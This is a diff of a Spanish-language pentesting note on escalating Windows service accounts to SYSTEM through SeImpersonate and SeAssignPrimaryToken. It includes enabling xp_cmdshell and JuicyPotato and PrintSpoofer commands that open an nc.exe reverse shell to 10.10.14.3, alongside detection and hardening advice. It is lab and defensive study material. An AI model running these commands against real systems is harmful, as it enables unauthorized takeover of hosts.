@@ -1,123 +1,115 @@
 # SeImpersonate y SeAssignPrimaryToken
 
+## Introducción
 
-* Windows maneja *tokens* de acceso que describen el contexto de seguridad de un proceso (SIDs, grupos, privilegios, etc.).
-* **SeImpersonatePrivilege** permite a un proceso **impersonar** (tomar el contexto de) otro usuario después de que ese usuario se haya autenticado.
-* **SeAssignPrimaryTokenPrivilege** permite **asignar o crear un token primario** para un proceso (CreateProcessAsUser-like), y es más poderoso y restringido.
-* Ambos privilegios son potentes porque permiten escalar privilegios localmente: e.g., transformar un proceso con privilegios de servicio en uno con contexto `NT AUTHORITY\SYSTEM`.
-* Ataques clásicos: **JuicyPotato**, **RoguePotato**, **PrintSpoofer** — abusan de servicios localmente ejecutándose como SYSTEM que conectan a un objeto RPC/COM y permiten la exfiltración/uso del token.
+El sistema Windows representa la identidad de cuentas y procesos mediante **tokens de acceso** (Access Tokens). Dos privilegios críticos relacionados con la reutilización o asignación de tokens son **SeImpersonatePrivilege** y **SeAssignPrimaryTokenPrivilege**. Ambos permiten a procesos con los derechos adecuados actuar con el contexto de otros usuarios y, si se abusan en entornos no endurecidos, posibilitan escaladas locales a NT AUTHORITY/SYSTEM.
 
 ---
 
-## Conceptos clave
+## Definición / Concepto
 
-* **Token de acceso (Access Token):** estructura en memoria que contiene identidad del usuario (SID), grupos, privilegios y lista de restricción.
-* **Impersonation vs Primary Token:**
+* **SeImpersonatePrivilege**: "Impersonate a client after authentication" — permite a un proceso (o hilo) **impersonar** a un cliente autenticado (usar su token de impersonación) para acceder a recursos en nombre de ese cliente.
+* **SeAssignPrimaryTokenPrivilege**: "Replace a process level token" — permite crear o asignar **tokens primarios** a procesos (por ejemplo, usar CreateProcessAsUser) y es más restrictivo.
 
-  * *Impersonation token* — usado por un thread para actuar como cliente; no siempre puede crear procesos.
-  * *Primary token* — token asignado a un proceso, permite crear procesos con ese contexto.
-* **SeImpersonatePrivilege:** concede la capacidad de `Impersonate a client after authentication`.
-* **SeAssignPrimaryTokenPrivilege:** concede la capacidad de `Replace a process level token` (crear/colocar tokens primarios).
-* **CreateProcessWithTokenW** y **CreateProcessAsUser** son APIs que requieren distintos privilegios: CreateProcessWithTokenW necesita token válido y el llamador debe poder usarlo (normalmente SeImpersonate puede ser suficiente en combinaciones con técnicas de token stealing); CreateProcessAsUser requiere SeAssignPrimaryToken.
+Diferencia práctica:
 
----
-
-## ¿Por qué son críticos en pentesting?
-
-* Muchos servicios (IIS, SQL Server, servicios Windows, spooler) corren con cuentas de servicio que tienen **SeImpersonate** o **SeAssignPrimaryToken** habilitado.
-* Si obtenés ejecución en el contexto de uno de esos servicios (ej. `nt service\mssql$sqlexpress01`, `iis apppool\defaultapppool`), podés comprobar inmediatamente si el servicio tiene dichas privilegios y, si es positivo, intentar escalada rápida a `SYSTEM`.
-* Estas escaladas son fáciles y rápidas: pocos comandos y herramientas públicas (JuicyPotato, PrintSpoofer).
+* *Impersonation token* suele estar asociado a un thread y se usa para actuar temporalmente como el cliente.
+* *Primary token* se asigna a un proceso entero y permite crear procesos enteros bajo esa identidad.
 
 ---
 
-## Flujo típico de explotación (alto nivel)
+## Contexto de abuso (por qué es relevante)
 
-1. Obtención de RCE en contexto de servicio no-SYSTEM (ej. shell vía `xp_cmdshell`, web shell en IIS, Jenkins RCE).
-2. Ejecutar `whoami /priv` o PowerShell para listar privilegios.
-3. Si aparece `SeImpersonatePrivilege` (Enabled) o `SeAssignPrimaryTokenPrivilege` → preparar exploit (JuicyPotato/PrintSpoofer).
-4. Subir ejecutable de explotación (JuicyPotato.exe / PrintSpoofer.exe) + binarios auxiliares (nc.exe o reverse shell payload).
-5. Ejecutar exploit apuntando a COM server id / listening port apropiado.
-6. Si tiene éxito, obtendrás un proceso con token `NT AUTHORITY\SYSTEM` (shell remoto) o CreateProcessAsUser OK.
+* Servicios que atienden conexiones de cliente (IIS, SQL Server, servicios RPC/COM) a menudo necesitan impersonar al usuario que realiza la petición para acceder a recursos (shares, bases de datos, otros servicios). Por ello, las cuentas de estos servicios a veces tienen SeImpersonate habilitado.
+* Si obtenés ejecución en el contexto de uno de esos servicios (por ejemplo, nt service/mssql$..., IIS APPPOOL/defaultapppool), la presencia de SeImpersonate o SeAssignPrimaryToken puede permitir una escalada rápida a SYSTEM.
 
 ---
 
-## Ejemplo práctico (resumen de pasos usados en labs)
+## Ejemplo de explotación (JuicyPotato / PrintSpoofer — flujo resumido)
 
-* Comprobar privilegios:
+1. Obtener RCE en contexto de un servicio (ej.: xp_cmdshell en SQL, web shell en IIS, Jenkins RCE).
+2. Confirmar la cuenta del proceso: whoami (ej. nt service/mssql$sqlexpress01).
+3. Comprobar privilegios: whoami /priv → comprobar SeImpersonatePrivilege o SeAssignPrimaryTokenPrivilege.
+4. Subir herramienta de explotación (JuicyPotato.exe, PrintSpoofer.exe, nc.exe).
+5. Ejecutar herramienta apuntando al CLSID/puerto COM apropiado y al payload (reverse shell).
+6. Si tiene éxito, obtendrás un shell como NT AUTHORITY/SYSTEM.
 
-  ```powershell
-  whoami /priv
-  # o en PowerShell
-  Get-Process -Id $PID | ForEach-Object { [Security.Principal.WindowsIdentity]::GetCurrent().Groups }
-  ```
-* Descargar y ejecutar JuicyPotato (ejemplo):
+---
+
+## Comandos y ejemplos prácticos
+
+* Comprobar identidad y privilegios:
 
   ```cmd
-  JuicyPotato.exe -l 53375 -p C:\Windows\System32\cmd.exe -a "/c C:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
+  whoami
+  whoami /priv
   ```
-* Resultado esperado: `CreateProcessWithTokenW OK` y conexión reversa con `NT AUTHORITY\SYSTEM`.
 
-> Nota: Ubicaciones y flags varían según la herramienta y la versión de Windows. JuicyPotato deja de funcionar en versiones recientes; PrintSpoofer o RoguePotato pueden funcionar en builds más nuevas.
+* Habilitar xp_cmdshell (ejemplo con Impacket mssqlclient):
+
+  ```sql
+  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+  ```
+
+* Ejecutar JuicyPotato (ejemplo):
+
+  ```cmd
+  JuicyPotato.exe -l 53375 -p C:/Windows/System32/cmd.exe -a "/c C:/tools/nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
+  ```
+
+* Ejecutar PrintSpoofer (ejemplo):
+
+  ```cmd
+  PrintSpoofer.exe -c "C:/tools/nc.exe 10.10.14.3 8443 -e cmd.exe"
+  ```
+
+> Observación: JuicyPotato no funciona en builds recientes de Windows; en esos casos probar PrintSpoofer, RoguePotato u otras variantes.
 
 ---
 
-## Artefactos y pistas de detección (logs/telemetría)
+## Detección (artefactos y logs)
 
-* **Eventos de seguridad**:
+* **Windows Security Event Log**:
 
-  * 4624/4634: logons (especialmente por servicios y SYSTEM).
-  * 4688: proceso creado (buscar procesos inusuales lanzados por servicios: cmd.exe, powershell.exe, nc.exe, rundll32.exe desde servicios).
-* **Sysmon (recomendado)**:
+  * 4624 / 4634 (logons), 4688 (creación de procesos) — buscar procesos inusuales creados por servicios.
+* **Sysmon**:
 
-  * EventID 1 (Process Create): observar procesos hijo de servicios (svchost, sqlservr.exe, w3wp.exe) que lancen cmd.exe/powershell.
-  * EventID 11/12/7: actividad en archivos subidos.
-  * EventID 3 (Network) y 10 (ProcessAccess) para rastrear acceso entre procesos.
-* **EPP/EDR**: creación de procesos con tokens differentes o llamadas a CreateProcessWithTokenW pueden disparar firmas.
-* **Named pipes / COM bindings**: herramientas Potato crean listeners (named pipes / RPC endpoints) — revisá conexiones IPC y registros de server COM.
-
----
-
-## Comprobaciones y hunting (quick wins)
-
-* Desde una shell con permisos: `whoami /priv`.
-* Listar privilegios en objetos y servicios: `sc qc <servicename>`, revisar `Log On As`.
-* Buscar cuentas con SeImpersonate habilitado (PowerShell):
-
-  ```powershell
-  # Requires AD / local audit scripts; para local: dump privileges with ntdsutil or tools como AccessChk
-  accesschk.exe -k *  # muestra privilegios en cuentas/servicios (sysinternals accesschk)
-  ```
-* En entorno AD, buscar GPOs o hardening que remuevan SeImpersonate de grupos no necesarios.
+  * EventID 1 (ProcessCreate): procesos hijos anómalos de servicios (ej. w3wp.exe -> cmd.exe).
+  * EventID 10 (ProcessAccess): accesos entre procesos que indican token stealing.
+  * EventID 3 (NetworkConnect): conexiones reversas (nc.exe).
+* **EDR**: llamadas a APIs sensibles (CreateProcessWithTokenW, CreateProcessAsUser) y creación de procesos con tokens distintos deben alertar.
+* Revisar named pipes y endpoints COM/RPC que estén siendo escuchados por procesos no habituales.
 
 ---
 
 ## Mitigaciones y hardening
 
-* **Eliminar SeImpersonate y SeAssignPrimaryToken** de cuentas que no lo necesitan (Local Security Policy -> User Rights Assignment) o mediante GPO.
-* **Principio de menor privilegio**: los servicios no deberían ejecutarse con cuentas que necesiten esos privilegios.
-* **Segregar servicios**: evitar usar cuentas con amplios derechos en servicios accesibles por usuarios/clients.
-* **Harden LSASS/Protecciones**: PPL, Credential Guard en entornos soportados.
-* **EDR / Sysmon**: monitorizar creación inusual de procesos y llamadas a APIs sensibles (CreateProcessWithTokenW, CreateProcessAsUser).
-* **Aplicar Application Whitelisting** y control de ejecución en servidores críticos.
+* **Eliminar los privilegios** SeImpersonatePrivilege y SeAssignPrimaryTokenPrivilege de cuentas que no los necesiten (Local Security Policy -> User Rights Assignment o GPO).
+* Ejecutar servicios con cuentas con menor privilegio (service accounts con permisos mínimos).
+* Separar responsabilidades: no usar la misma cuenta para múltiples servicios críticos.
+* Habilitar PPL / LSASS protections y tecnologías como Credential Guard cuando aplique.
+* Implementar Sysmon + EDR con reglas que detecten procesos creados desde servicios y uso de APIs de token.
+* Application whitelisting y bloqueo de ejecución de binarios no autorizados en servidores críticos.
 
 ---
 
-## 9. Checklist cuando se encuentra RCE en servicio
+## Checklist
 
-1. `whoami /priv` — ¿SeImpersonate o SeAssignPrimaryToken aparecen?
-2. Subir JuicyPotato/PrintSpoofer (o usar versiones publicadas) a ruta temporal.
-3. Ejecutar con parámetros apropiados (puerto COM/CLSID, payload).
-4. Si falla, probar alternativas (PrintSpoofer, RoguePotato, distintos CLSIDs).
-5. Si obtienes SYSTEM, recolectar evidencia y continuar post-exploitation con cuidado (hashes SAM, LSA secrets si aplica).
-6. Documentar y reportar: qué cuenta tenía el privilegio, cómo se explotó, recomendaciones de mitigación.
+* [ ] Obtener RCE en contexto de servicio.
+* [ ] whoami y whoami /priv.
+* [ ] Subir herramienta de explotación compatible con la versión de Windows objetivo.
+* [ ] Intentar JuicyPotato → si falla, probar PrintSpoofer / RoguePotato / alternativas.
+* [ ] Si obtienes SYSTEM, documentar evidencia y limpiar artefactos en entorno de laboratorio.
 
 ---
 
-## Recursos recomendados
+## Notas finales y recursos
 
-* Artículos técnicas sobre JuicyPotato, PrintSpoofer, RoguePotato y token impersonation.
-* Documentación Microsoft sobre tokens y privilegios (Token, CreateProcessWithTokenW, CreateProcessAsUser).
+* JuicyPotato, PrintSpoofer y RoguePotato son ejemplos públicos; su efectividad depende de la build de Windows.
+* Consulta documentación técnica sobre tokens y las APIs CreateProcessWithTokenW, CreateProcessAsUser para profundizar.
+* Siempre trabajar en entornos controlados y con autorización.
 
+---
 
-
-*Pista: usa este lienzo como guía rápida en tus laboratorios. Para cada objetivo real, adapta los comandos y asegúrate de trabajar siempre en entornos autorizados y aislados.*
+*Fin.*
